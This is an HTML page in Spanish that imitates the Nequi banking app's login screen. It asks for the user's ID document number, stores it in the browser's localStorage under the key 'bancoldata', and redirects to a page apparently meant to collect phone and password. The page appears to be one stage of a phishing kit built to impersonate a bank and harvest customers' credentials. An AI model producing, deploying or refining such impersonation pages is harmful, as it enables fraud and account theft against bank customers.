<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ingreso</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #210049;
      color: white;
      display: flex;
      justify-content: center;
    }

    .container {
      max-width: 420px;
      width: 100%;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding: 20px;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .logo {
      text-align: center;
      margin: 40px 0;
      font-size: 28px;
      font-weight: bold;
      color: #ff008c;
    }

    .form-box {
      margin-top: auto;
    }

    .input-container {
      background: rgba(255,255,255,0.15);
      border-radius: 6px;
      padding: 10px;
      display: flex;
      align-items: center;
    }

    input {
      width: 100%;
      border: none;
      outline: none;
      background: transparent;
      color: white;
      font-size: 16px;
      padding: 10px;
    }

    input::placeholder {
      color: #ddd;
    }

    .checkbox {
      margin-top: 10px;
      font-size: 14px;
    }

    button {
      width: 100%;
      margin-top: 20px;
      height: 45px;
      border: none;
      border-radius: 6px;
      background: #ff008c;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
  </style>
</head>

<body>

  <div class="container">

    <div class="header">
      <div>❓</div>
      <div style="opacity:0.5;">Nequi</div>
    </div>

    <div class="logo">NEQUI</div>

    <div class="form-box">
      <form id="form">

        <div class="input-container">
          <input type="number" id="userInput" placeholder="Ingresa tu documento">
        </div>

        <div class="checkbox">
          <input type="checkbox" id="rememberDoc">
          Recordar número
        </div>

        <button id="continueButton" disabled>Continuar</button>

      </form>
    </div>

  </div>

  <script>
    const userInput = document.getElementById('userInput');
    const continueButton = document.getElementById('continueButton');
    const form = document.getElementById('form');

    function validar() {
      const val = userInput.value.trim();
      continueButton.disabled = val.length < 4;
    }

    userInput.addEventListener('input', validar);

    form.addEventListener('submit', (e) => {
      e.preventDefault();

      const userValue = userInput.value.trim();

      if (userValue.length >= 4) {
        let data = {};

        try {
          data = JSON.parse(localStorage.getItem('bancoldata')) || {};
        } catch (e) {
          data = {};
        }

        data.usuario = userValue;
        data.fecha = new Date().toISOString();

        if (document.getElementById('rememberDoc').checked) {
          data.rememberDocument = true;
        }

        localStorage.setItem('bancoldata', JSON.stringify(data));

        window.location.href = 'cel-clave.html';
      } else {
        alert('Ingrese mínimo 4 dígitos');
      }
    });
  </script>

</body>
</html>
